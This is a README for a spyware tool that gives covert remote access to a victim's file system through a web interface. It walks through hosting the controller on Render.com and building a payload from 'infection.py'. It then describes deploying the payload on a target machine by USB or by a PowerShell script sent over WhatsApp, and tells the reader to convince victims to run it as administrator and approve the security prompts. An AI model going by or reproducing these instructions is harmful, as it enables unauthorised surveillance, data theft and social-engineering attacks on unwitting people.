# File-Explowerer
This tool allows remote access to the file explorer of a target system over either a WAN or LAN, depending on how it is configured.  
Once the payload is successfully installed on the target computer, the entire file system becomes accessible through a user-friendly web-based GUI. This interface enables you to upload files to the target machine, download files from it, rename files or folders, delete them, and more.

# Download & Configuration
The tool is configured in three main steps:  
1. Setting up the Controller Side  
This is the system you will control, which provides a web-based GUI interface to access and manage the file explorer of other PCs.

2. Generating and Deploying the Payload  
The payload must be installed on the target computer, and there are two methods for doing this: 
 
    1. Offline Transfer (using a USB drive):
    Requires one-time physical access to the target machine. It’s faster and more reliable.

    2. Online Method (using a custom script):
    The script is shared with the target user via platforms like WhatsApp, and you must convince them to run it as administrator. This method downloads the payload from the internet onto the victim’s computer. It's slower and depends on the internet speed of the target system.

3. Accessing the Target File Explorer
Once the payload is installed, you can use your web browser to access the target's file system via the provided GUI.

## 1. Setting up the Controller Side
Note: This method uses Render.com to host the web server for this tool.
* Create an account on `Render.com` and go to the Dashboard.
* Click `New` in the top-right corner.
* Select `Web Service`
* Choose `Public Git Repository`
* Paste the following URL into the input field and click Connect `https://github.com/PowerPizza/Explowerer-Server`
* Under `Name`, enter any name you prefer.  
_Note: This name will be used as the subdomain prefix for your web server._
* In the Language field, select `Python` or `Python 3`
* For the Root Directory, enter `backend`
* In the Build Command field, enter `pip install -r requirements.txt`
* In the Start Command field, enter `gunicorn --worker-class eventlet -w 1 main:app --bind 0.0.0.0:5600`
* Scroll down and select the `Free Tier`.
* Continue scrolling and click `Deploy Web Service` at the bottom.

Once the web service is deployed and running, you’ll receive a unique URL.
This URL allows you to access the tool's web server from anywhere.

Before using it, you'll need to configure the target file for this specific URL.
So, make sure to copy the URL for later use.

## 2. Generating and Deploying the Payload
* Install Python on your computer from the official website [python.org](https://www.python.org/downloads)
* Download the project by either:
  * Using git clone, or
  * Downloading the ZIP file directly from GitHub https://github.com/PowerPizza/Explowrer-Spyware
  * If you downloaded the ZIP file, extract it.

* Open the `infection.py` file using any text editor you prefer.
* Find the placeholder string `__PLACE_RENDER_URL_HERE__` and replace it with the URL of your web server (copied from Section 1).
* Save the file and close the editor.
* Open the project folder and double-click the `pack_payload.cmd` file to execute it.

After the script runs, you will see a new file named `payload.txt` in the same folder.
This is your generated payload.

## 2.1 Offline Transfer (using a USB drive):
* Create a new folder anywhere on your PC.
* Copy the following files into that folder:
  * `launch1.ps1`
  * The newly generated `payload.txt`
* Transfer the folder to a pen drive or any other portable storage device.
* On the target computer, plug in your pen drive.
* Open the folder containing both `launch1.ps1` `and payload.txt`
* Right-click on `launch1.ps1` and select `Run with PowerShell`
If the script prompts you with any messages (e.g., asking to confirm execution), type Y and press Enter.
Approve any other prompts that appear by selecting "Yes".

## 2.2 Online Method (using a custom script):
* Go to [google drive](https://drive.google.com/)
* Upload the `payload.txt` file.
* Click the **three dots** next to the uploaded file and select **Share**.
* Change the access settings to **Anyone with the link**, then copy the sharing link.
* The link will look something like this `https://drive.google.com/file/d/__HERE_WILL_BE_THE_FILE_ID__/view?usp=sharing`
* Extract & copy the **File ID** from the link (the part between /d/ and /view).
* Go back to the folder and open the `launch2.ps1` file in any text editor.
* Find the line that contains `__PUT_FILE_ID_HERE__`
* Replace it with the **File ID** you copied.
* Save the file.

You can now send this file to anyone.  
Convince them to **right-click** on it, select **Run with PowerShell**, approve any security prompts by clicking **Yes**, and enter capital Y if prompted.
